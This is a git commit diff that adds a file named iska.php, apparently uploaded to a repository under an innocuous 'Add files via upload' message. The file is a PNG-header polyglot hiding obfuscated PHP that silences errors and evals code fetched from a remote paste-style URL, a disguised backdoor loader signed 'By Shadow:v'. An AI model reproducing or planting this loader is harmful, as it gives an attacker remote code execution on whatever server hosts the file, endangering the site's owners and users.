79ebcb0b104a5014951fc46bb3ff14cf580a8b15
betatestergaming22-web <betatestergaming22@gmail.com>
2026-07-16 04:41:44 +0700

    Add files via upload

---
+++ iska.php
@@ -0,0 +1,5 @@
+�PNG
+
+���
+IHDR�������������IDATx�c``����+	M�����IEND�B`�
+<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://chizu.space/raw/d1db4f"))/******/ /*By Shadow:v*/?>
